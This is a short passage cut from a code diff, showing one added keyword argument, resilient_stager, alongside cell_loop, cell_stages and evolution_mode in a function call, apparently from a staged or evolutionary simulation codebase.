+                            resilient_stager=resilient_stager,
                             cell_loop=cell_loop,
                             cell_stages=cell_stages,
                             evolution_mode=evolution_mode)
